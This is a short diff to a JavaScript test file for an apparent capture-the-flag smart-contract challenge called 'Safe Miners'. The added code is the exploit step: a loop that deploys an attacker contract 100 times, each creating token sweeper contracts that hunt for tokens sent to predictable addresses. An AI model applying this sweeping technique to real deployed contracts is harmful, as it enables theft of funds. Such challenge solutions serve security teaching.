@@ -24,6 +24,14 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+    // Disable timeouts
+    this.timeout(0);
+
+    for (let nonce = 0; nonce < 100; nonce++) {
+        // Have each attack contract create 100 token sweeper contracts and check balance
+        await (await ethers.getContractFactory('AttackSafeMiners', attacker)).deploy(attacker.address, this.token.address, 100);
+    }
     });
 
     after(async function () {
